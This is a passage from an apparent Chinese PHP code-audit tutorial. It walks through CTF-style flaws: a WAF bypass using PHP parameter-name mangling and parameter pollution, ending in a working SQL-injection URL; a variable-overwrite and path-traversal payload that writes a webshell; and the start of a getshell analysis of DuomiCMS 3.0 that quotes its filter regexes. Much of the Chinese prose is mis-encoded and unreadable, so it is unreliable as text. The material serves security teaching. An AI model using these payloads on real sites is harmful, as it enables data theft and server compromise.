invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;&amp;amp;&#x27;</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span>, <span class="string">&#x27;ï¼‰&#x27;</span>), <span class="variable">$string</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$string</span>, <span class="string">&#x27;&amp;amp;#&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">              <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&#x27;</span>, <span class="string">&#x27;&amp;\\1&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dowith_sql</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$check</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|insert|update|delete|\&#x27;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$check</span>) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;éæ³•å­—ç¬¦!&quot;</span>;</span><br><span class="line">          <span class="keyword">exit</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ç»è¿‡ç¬¬ä¸€ä¸ªwafå¤„ç†</span></span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">      <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">dowith_sql</span>(<span class="variable">$value</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ç»è¿‡ç¬¬äºŒä¸ªWAFå¤„ç†</span></span><br><span class="line">  <span class="variable">$request_uri</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;?&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$request_uri</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="variable">$rewrite_url</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>, <span class="variable">$request_uri</span>[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable">$rewrite_url</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">          <span class="variable">$_value</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;=&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_value</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">              <span class="variable">$_REQUEST</span>[<span class="variable">$_value</span>[<span class="number">0</span>]] = <span class="title function_ invoke__">dhtmlspecialchars</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_value</span>[<span class="number">1</span>]));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ä¸šåŠ¡å¤„ç†</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$user_id</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;i_d&#x27;</span>];</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;select * from ctf.users where id=<span class="subst">$user_id</span>&quot;</span>;</span><br><span class="line">      <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>å¯¹äºä¼ å…¥çš„éæ³•çš„ <strong>$_GET</strong> æ•°ç»„å‚æ•°åï¼ŒPHPä¼šå°†ä»–ä»¬æ›¿æ¢æˆ <strong>ä¸‹åˆ’çº¿</strong> ã€‚ç»è¿‡fuzzï¼Œæœ‰ä»¥ä¸‹è¿™äº›å­—ç¬¦ï¼š</li></ul><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-20.png"></p><ul><li>å½“æˆ‘ä»¬ä½¿ç”¨HPPï¼ˆHTTPå‚æ•°æ±¡æŸ“ï¼‰ä¼ å…¥å¤šä¸ªç›¸åŒå‚æ•°ç»™æœåŠ¡å™¨æ—¶ï¼ŒPHPåªä¼šæ¥æ”¶åˆ°åè€…çš„å€¼ã€‚ï¼ˆè¿™ä¸€ç‰¹æ€§å’Œä¸­é—´ä»¶æœ‰å…³ç³»ï¼‰</li></ul><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-21.png"></p><ul><li>é€šè¿‡ <strong>$_SERVER[â€˜REQUEST_URIâ€™]</strong> æ–¹å¼è·å¾—çš„å‚æ•°ï¼Œå¹¶ä¸ä¼šå¯¹å‚æ•°ä¸­çš„æŸäº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œæ›¿æ¢ã€‚</li></ul><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-22.png"></p><p>è¿™é‡Œçš„ä»£ç ä¸­æœ‰ä¸¤ä¸ªwafã€‚</p><p>ç¬¬ä¸€ä¸ªWAFåœ¨ä»£ç  <strong>ç¬¬29è¡Œ-ç¬¬30è¡Œ</strong> ï¼Œè¿™é‡Œé¢é‡‡ç”¨äº† <strong>dowith_sql()</strong> å‡½æ•°ï¼Œè·Ÿè¿›ä¸€ä¸‹ <strong>dowith_sql()</strong> å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸»è¦åŠŸèƒ½ä»£ç åœ¨ <strong>ç¬¬19-ç¬¬26è¡Œ</strong> ï¼Œå¦‚æœ <strong>$_REQUEST</strong> æ•°ç»„ä¸­çš„æ•°æ®å­˜åœ¨ <strong>select|insert|update|delete</strong> ç­‰æ•æ„Ÿå…³é”®å­—æˆ–è€…æ˜¯å­—ç¬¦ï¼Œåˆ™ç›´æ¥ <strong>exit()</strong> ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åŸå­—ç¬¦ä¸²è¿”å›ã€‚</p><p>è€Œç¬¬äºŒä¸ªWAFåœ¨ä»£ç  <strong>ç¬¬33è¡Œ-ç¬¬39è¡Œ</strong> ï¼Œè¿™éƒ¨åˆ†ä»£ç é€šè¿‡ <strong>$_SERVER[â€˜REQUEST_URIâ€™]</strong> çš„æ–¹å¼è·å–å‚æ•°ï¼Œç„¶åä½¿ç”¨ <strong>explode</strong> å‡½æ•°é’ˆå¯¹ <strong>&amp;</strong> è¿›è¡Œåˆ†å‰²ï¼Œè·å–åˆ°æ¯ä¸ªå‚æ•°çš„å‚æ•°åå’Œå‚æ•°å€¼ã€‚ç„¶åé’ˆå¯¹æ¯ä¸ªå‚æ•°å€¼è°ƒç”¨ <strong>dhtmlspecialchars()</strong> å‡½æ•°è¿›è¡Œè¿‡æ»¤ã€‚</p><p>è·Ÿè¿›ä¸€ä¸‹ <strong>dhtmlspecialchars()</strong> å‡½æ•°ï¼Œå‘ç°å…¶ç›¸å…³åŠŸèƒ½ä»£ç åœ¨ <strong>ç¬¬3è¡Œ-ç¬¬14è¡Œ</strong> ï¼Œè¿™ä¸ªå‡½æ•°ä¸»è¦åŠŸèƒ½æ˜¯é’ˆå¯¹ <strong>â€˜&amp;â€™, â€˜â€œâ€˜, â€˜&lt;â€™, â€˜&gt;â€™, â€˜(â€˜, â€˜)â€™</strong> ç­‰ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤æ›¿æ¢ï¼Œæœ€åè¿”å›æ›¿æ¢åçš„å†…å®¹ã€‚ä» <strong>ç¬¬44è¡Œå’Œç¬¬45è¡Œ</strong> çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é¢˜çš„å‚æ•°éƒ½æ˜¯é€šè¿‡ <strong>REQUEST</strong> æ–¹å¼è·å–ã€‚æˆ‘ä»¬å¯ä»¥å…ˆæ¥çœ‹ä¸ªä¾‹å­ï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-23.png"></p><p>ç¬¬ä¸€æ¬¡ <strong>$_REQUEST</strong> ä»…ä»…åªä¼šè¾“å‡º <strong>i_d&#x3D;2</strong> çš„åŸå› æ˜¯å› ä¸ºphpè‡ªåŠ¨å°† <strong>i.d</strong> æ›¿æ¢æˆäº† <strong>i_d</strong> ã€‚è€Œæ ¹æ®æˆ‘ä»¬å‰é¢è¯´çš„ç¬¬äºŒä¸ªç‰¹æ€§ï¼ŒPHPå–æœ€åä¸€ä¸ªå‚æ•°å¯¹åº”çš„å€¼ï¼Œå› æ­¤ç¬¬ä¸€æ¬¡ <strong>$_REQUEST</strong> è¾“å‡ºçš„æ˜¯2ã€‚</p><p>ç¬¬äºŒæ¬¡ <strong>$_REQUEST</strong> ä¼šè¾“å‡º <strong>i_d&#x3D;select&amp;i.d&#x3D;2</strong> æ˜¯å› ä¸º <strong>$_SERVER[â€˜REQUEST_URIâ€™]</strong> å¹¶ä¸ä¼šå¯¹ç‰¹æ®Šçš„ç¬¦å·è¿›è¡Œæ›¿æ¢ï¼Œå› æ­¤ç»“æœä¼šåŸå°ä¸åŠ¨çš„è¾“å‡ºã€‚æ‰€ä»¥è¿™é¢˜çš„payloadå¯ä»¥æ ¹æ®ä¸‹é¢è¿™ä¸ªæ€ç»´å¯¼å›¾è¿›è¡Œæ„é€ ï¼š<br><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-24.png"></p><ul><li>æˆ‘ä»¬é€šè¿‡é¡µé¢è¯·æ±‚ <strong>i_d&#x3D;padyload&amp;i.d&#x3D;123</strong> ã€‚</li><li>å½“æ•°æ®æµåˆ°è¾¾ç¬¬ä¸€ä¸ªWAFæ—¶ï¼Œphpä¼šå°†å‚æ•°ä¸­çš„æŸäº›ç‰¹æ®Šç¬¦å·æ›¿æ¢ä¸ºä¸‹åˆ’çº¿ã€‚å› æ­¤ä¾¿å¾—åˆ°äº†ä¸¤ä¸ª <strong>i_d</strong> ï¼Œæ‰€ä»¥æ­¤æ—¶çš„payloadå˜æˆäº† <strong>i_d&#x3D;payload&amp;i_d&#x3D;123</strong> ã€‚</li><li>å‰é¢æˆ‘ä»¬ä»‹ç»äº†ï¼Œå¦‚æœå‚æ•°ç›¸åŒçš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ <strong>ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥çš„å€¼</strong> ä¼šè¦†ç›– <strong>ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„å€¼</strong> ã€‚å› æ­¤æ­¤æ—¶åœ¨ç¬¬ä¸€ä¸ªWAFä¸­ <strong>i_d&#x3D;123</strong> ï¼Œä¸å­˜åœ¨å…¶ä»–ç‰¹æ®Šçš„å­—ç¬¦ï¼Œå› æ­¤ç»•è¿‡äº†ç¬¬ä¸€ä¸ªWAFã€‚</li><li>å½“æ•°æ®æµåˆ°è¾¾è¿›å…¥åˆ°ç¬¬äºŒä¸ªWAFæ—¶ï¼Œç”±äºä»£ç æ˜¯é€šè¿‡ <strong>$_SERVER[â€˜REQUEST_URIâ€™]</strong> å–å‚æ•°ï¼Œè€Œæˆ‘ä»¬å‰é¢å¼€å¤´çš„ç¬¬ä¸‰ä¸ªçŸ¥è¯†ç‚¹å·²ç»ä»‹ç»è¿‡äº† <strong>$_SERVER[â€˜REQUEST_URIâ€™]</strong> æ˜¯ä¸ä¼šå°†å‚æ•°ä¸­çš„ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬æ¢ï¼Œå› æ­¤è¿™é‡Œçš„ <strong>i.d</strong> å‚æ•°å¹¶ä¸ä¼šè¢«æ›¿æ¢ä¸º <strong>i_d</strong> ï¼Œæ‰€ä»¥æ­¤æ—¶æ­£å¸¸æ¥è¯´ <strong>i.d</strong> å’Œ <strong>i_d</strong> éƒ½èƒ½ç»è¿‡ç¬¬äºŒä¸ªWAFã€‚</li><li>ç¬¬äºŒä¸ªWAFä¸­æœ‰ä¸€ä¸ª <strong>dhtmlspecialchars()</strong> å‡½æ•°ï¼Œè¿™é‡Œéœ€è¦ç»•è¿‡å®ƒï¼Œå…¶å®å¾ˆå¥½ç»•è¿‡ã€‚ç»•è¿‡ä¹‹å <strong>i_d&#x3D;payload&amp;i.d&#x3D;123</strong> ä¾¿ä¼šè¿›å…¥åˆ°ä¸šåŠ¡å±‚ä»£ç ä¸­ï¼Œæ‰§è¡ŒSQLè¯­å¥ï¼Œç”±äºè¿™é‡Œçš„SQLè¯­å¥é‡‡ç”¨æ‹¼æ¥çš„æ–¹å¼ï¼Œå› æ­¤å­˜åœ¨SQLæ³¨å…¥ã€‚</li></ul><p>å› æ­¤æœ€åpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?submit=&amp;i_d=-1/**/union/**/select/**/1,flag,3,4/**/from/**/ctf.users&amp;i.d=123</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« <br><a href="https://blog.csdn.net/u011721501/article/details/51824576">PHPçš„ä¸¤ä¸ªç‰¹æ€§å¯¼è‡´wafç»•è¿‡æ³¨å…¥</a><br><a href="https://blog.spoock.com/2018/05/05/request-vuln-analysis/">requestå¯¼è‡´çš„å®‰å…¨æ€§é—®é¢˜åˆ†æ</a> </p><h2 id="Day-14-Snowman"><a href="#Day-14-Snowman" class="headerlink" title="Day 14 - Snowman"></a>Day 14 - Snowman</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Carrot</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">EXTERNAL_DIRECTORY</span> = <span class="string">&#x27;/tmp/&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lost</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$bought</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$field</span> =&gt; <span class="variable">$count</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$field</span> = <span class="variable">$count</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable constant_">EXTERNAL_DIRECTORY</span> . <span class="variable">$this</span>-&gt;id,</span><br><span class="line">            <span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$this</span>), <span class="literal">true</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$carrot</span> = <span class="keyword">new</span> <span class="title class_">Carrot</span>(<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure><p><strong>æ¼æ´è§£æ</strong> ï¼š</p><p>è¿™é“é¢˜ç›®è®²çš„æ˜¯ä¸€ä¸ª <strong>å˜é‡è¦†ç›–</strong> ä¸ <strong>è·¯å¾„ç©¿è¶Š</strong> é—®é¢˜ã€‚åœ¨ <strong>ç¬¬10-11è¡Œ</strong> å¤„ï¼Œ <strong>Carrot</strong> ç±»çš„æ„é€ æ–¹æ³•å°†è¶…å…¨å±€æ•°ç»„ <strong>$_GET</strong> è¿›è¡Œå˜é‡æ³¨å†Œï¼Œè¿™æ ·å³å¯è¦†ç›– <strong>ç¬¬8è¡Œ</strong> å·²å®šä¹‰çš„ <strong>$this-&gt;</strong> å˜é‡ã€‚è€Œåœ¨ <strong>ç¬¬16è¡Œ</strong> å¤„çš„ææ„å‡½æ•°ä¸­ï¼Œ <strong>file_put_contents</strong> å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°åˆæ˜¯ç”± <strong>$this-&gt;</strong> å˜é‡æ‹¼æ¥çš„ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬å¯ä»¥æ§åˆ¶å†™å…¥æ–‡ä»¶çš„ä½ç½®ï¼Œæœ€ç»ˆé€ æˆä»»æ„æ–‡ä»¶å†™å…¥é—®é¢˜ã€‚ä¸‹é¢æˆ‘ä»¬è¯•ç€ä½¿ç”¨ <strong>payload</strong> ï¼š<strong>id&#x3D;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&amp;shell&#x3D;â€™,)%0a<?php phpinfo();?>&#x2F;&#x2F;</strong> å†™å…¥ <strong>webshell</strong> ï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-25.png"></p><h3 id="å®ä¾‹åˆ†æ-2"><a href="#å®ä¾‹åˆ†æ-2" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>æœ¬æ¬¡å®ä¾‹åˆ†æï¼Œæˆ‘ä»¬é€‰å–çš„æ˜¯ <strong><a href="https://duomicms.net/">DuomiCMS_3.0</a></strong> æœ€æ–°ç‰ˆã€‚è¯¥CMSå­˜åœ¨å…¨å±€å˜é‡æ³¨å†Œé—®é¢˜ï¼Œå¦‚æœç¨‹åºç¼–å†™ä¸å½“ï¼Œä¼šå¯¼è‡´å˜é‡è¦†ç›–ï¼Œæœ¬æ¬¡æˆ‘ä»¬ä¾¿æ¥åˆ†æ <strong>ç”±å˜é‡è¦†ç›–å¯¼è‡´çš„getshell</strong> é—®é¢˜ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹è¯¥CMSä¸­çš„å…¨å±€å˜é‡æ³¨å†Œä»£ç ï¼Œè¯¥ä»£ç ä½äº <strong>duomiphp&#x2F;common.php</strong> æ–‡ä»¶ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="title function_ invoke__">Array</span>(<span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) $&#123;<span class="variable">$_k</span>&#125; = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$_v</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span>(<span class="params">&amp;<span class="variable">$svar</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$svar</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$svar</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) <span class="variable">$svar</span>[<span class="variable">$_k</span>] = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$_v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$svar</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$svar</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$svar</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <strong>_RunMagicQuotes</strong> å‡½æ•°å°†ç‰¹æ®Šç¬¦å·ï¼Œä½¿ç”¨ <strong>addslashes</strong> å‡½æ•°è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚æˆ‘ä»¬æ¥æœç´¢ <strong>fwrite</strong> å‡½æ•°ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨å¯åˆ©ç”¨çš„å†™æ–‡ä»¶ç¨‹åºï¼ˆä¸ºäº†å†™ <strong>shell</strong> ï¼‰ã€‚<strong>phpstorm</strong> ç¨‹åºæœç´¢ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-26.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª <strong>admin\admin_ping.php</strong> æ–‡ä»¶ä¸­ï¼Œå­˜åœ¨å¯åˆ©ç”¨çš„åœ°æ–¹ï¼Œå› ä¸ºå…¶å†™å…¥çš„ç›®æ ‡æ–‡ä»¶ä¸º <strong>PHP</strong> ç¨‹åºï¼Œä¸”å†™å…¥å†…å®¹ä¸­å­˜åœ¨ä¸¤ä¸ªå¯æ§å˜é‡ã€‚å…¶ä»£ç å…·ä½“å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-27.png"></p><p><strong>$weburl</strong> å˜é‡å’Œ <strong>$token</strong> å˜é‡ä» <strong>POSTæ–¹å¼</strong> è·å–ï¼Œå…¶å˜é‡ä¹Ÿåªæ˜¯ç»è¿‡ <strong>_RunMagicQuotes</strong> å‡½æ•°è¿‡æ»¤å¤„ç†ï¼Œä»¥åŠ <strong>duomiphp\webscan.php</strong> æ–‡ä»¶çš„è¿‡æ»¤è§„åˆ™ï¼Œä½†æ˜¯å¹¶ä¸å½±å“æˆ‘ä»¬å†™shellã€‚è¿‡æ»¤è§„åˆ™å…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$getfilter</span> = <span class="string">&quot;\\k.+javascript:window\\[.*\\]|&lt;.*(&amp;#\\d+;)+?&gt;|&lt;.*(data|src)=data:text\\html.*?&gt;|\\b(alert\\|confirm\\|expression\\|prompt\\|benchmark.*|sleep.*|group.*)\\b(load_file|benchmark|[a-z]&#123;4,&#125;)\\b|\\bon\\w+=[^&gt;]+\\&gt;|SELECT\\s+(.*.)+\\b@&#123;1,2&#125;\\s+.*|SET\\s+.*\\b;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$postfilter</span> = <span class="string">&quot;&lt;.*=&amp;(#\\d+;)+?&gt;.*\\b(alert\\|confirm\\|expression\\|prompt\\|benchmark.*|sleep.*|group.*)\\b(load_file|benchmark)\\b|\\bon\\w+=[^&gt;]+\\&gt;|\\bEXEC\\b|UNION\\s+SELECT.*|INSERT\\s+INTO.*VALUES\\s*(\\(.*)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cookiefilter</span> = <span class="string">&quot;benchmark.*|\\b(load_file|exec|SELECT|INSERT|DELETE|CREATE|ALTER|DROP|TRUNCATE|\\@@)\\b.*?VALUES\\(.*|SET\\s+.*&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç„¶è€Œè¦æƒ³åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¿…é¡»æ˜¯ <strong>admin</strong> èº«ä»½ï¼Œä¸ç„¶æ²¡æœ‰æƒé™è®¿é—®è¯¥æ–‡ä»¶ã€‚æ‰€ä»¥æˆ‘ä»¬çœ‹çœ‹è¯¥CMSæ˜¯å¦‚ä½•å¯¹ç”¨æˆ·èº«ä»½è¿›è¡Œè®¤å®šçš„ï¼Œæ˜¯å¦å¯ä»¥åˆ©ç”¨ä¹‹å‰çš„å˜é‡è¦†ç›–æ¥ä¼ªé€ èº«ä»½å‘¢ï¼Ÿ</p><p>è·Ÿè¿› <strong>admin\admin_ping.php</strong> æ–‡ä»¶å¼€å¤´åŒ…å«çš„ <strong>admin\config.php</strong> æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦å…³æ³¨çš„æ˜¯å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(duomi_INC . <span class="string">&quot;/check.admin.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cuserLogin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">userLogin</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cuserLogin</span>-&gt;<span class="title function_ invoke__">getUserID</span>() === -<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php?gotoPage=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$EkNowurl</span>));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦çŸ¥é“ç¨‹åºæ˜¯å¦‚ä½•å¯¹ç”¨æˆ·çš„èº«ä»½è¿›è¡Œå¤„ç†çš„ï¼Œè·Ÿè¿› <strong>duomiphp\check.admin.php</strong> æ–‡ä»¶ï¼Œå…³æ³¨å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">userLogin</span></span></span><br><span class="line"><span 